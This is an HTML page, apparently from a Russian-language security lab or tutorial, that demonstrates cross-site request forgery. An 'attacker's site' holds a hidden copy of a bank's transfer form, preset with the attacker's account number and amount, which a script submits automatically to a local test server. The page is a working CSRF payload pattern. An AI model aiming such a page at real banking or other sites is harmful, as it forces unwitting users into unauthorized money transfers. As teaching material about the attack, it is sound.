<!DOCTYPE html>
<html lang="ru-luna1918">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="HandheldFriendly" content="true">
    <meta name="MobileOptimized" content="0">
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1, shrink-to-fit=no"
        >
    <title>Сайт злоумышленника</title>
    <link
        rel="stylesheet"
        href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
        integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
        crossorigin="anonymous"
        >
    <script
        defer
        src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
        integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8="
        crossorigin="anonymous"
        ></script>

    <!-- Сценарий для предъявления формы без участия пользователя. -->
    <script
        defer
        src="submit.js"
        integrity="sha256-8TPYc4ila/fW4NtS/J9m3bevorDaHuX/HRmvxqkDVkU="
        crossorigin="anonymous"
        ></script>
</head>
<body class="bg-danger text-white">
    <main class="container">
        <h1>Сайт злоумышленника</h1>

        <!-- Копия размещённой на сайте банка формы для денежного перевода. -->
        <!-- Форма не отображается в браузере и предъявляется автоматически. -->
        <form
            action="http://127.0.0.1:8080/transfer.php"
            class="d-none"
            method="post"
            >

            <!-- Заявленный злоумышленником номер счёта получателя. -->
            <input name="account" value="12309">

            <!-- Заявленная злоумышленником сумма денежного перевода. -->
            <input name="amount" value="54614">

            <!-- Для автоматического предъявления формы кнопка не нужна. -->
        </form>
    </main>
</body>
</html>
